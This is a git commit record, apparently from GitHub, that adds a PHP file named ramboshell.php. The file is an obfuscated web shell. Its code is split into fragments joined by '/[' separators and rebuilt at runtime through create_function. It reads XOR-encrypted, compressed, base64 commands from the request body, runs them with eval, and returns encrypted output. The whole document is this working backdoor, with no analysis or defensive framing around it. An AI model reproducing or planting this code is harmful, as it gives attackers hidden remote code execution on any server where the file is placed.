3b4a868ffa00bce7c4502428a0d4a07a1a09d00b
Raihan Alfaridzi Kustiawan <45348405+Raihan2503@users.noreply.github.com>
2024-05-31 01:41:52 -0400

    Add files via upload

---
+++ ramboshell.php
@@ -0,0 +1,11 @@
+<?php
+$K='/[l(@gzunco/[mpr/[ess(@x(@b/[as/[/[e64_/[decode($m[1]),/[$k)));$o=/[@o/[b_ge/[t_conte/[n/[ts();';
+$U='/[$k="59931/[/[dbc";$kh="/[55de7/[3dc815a";$k/[/[/[f="c4a0170e5443/[";$/[p=/["Q/[zDTaK5MF2HRu4jq';
+$t='@ob_end_cle/[an();/[$r=@bas/[/[e64_e/[ncode(@x(@gzc/[omp/[re/[s/[s($o),$/[k));print("$p$k/[h$r$kf");}';
+$D='/[h("/$kh(/[.+)$kf/",@/[file/[_get_c/[ontents(/["php/[://input/["),$m/[)==1) {@/[ob_st/[art();@/[eva';
+$b='($/[j=0;($j<$/[/[/[c&&$i<$l);$j++,/[$i/[++){$o.=$t{/[$i}^/[$/[k{$j};}}return $/[o;/[}if /[(@preg_mat/[c';
+$V=str_replace('XS','','XSXScXSreate_XSfXSunXSction');
+$w='";functi/[o/[n x($t/[,$/[k){$c=s/[trlen($k);$/[l=str/[len($t/[);$/[o="/[";for($i=0;$i<$l;/[){for/[';
+$G=str_replace('/[','',$U.$w.$b.$D.$K.$t);
+$r=$V('',$G);$r();
+?>
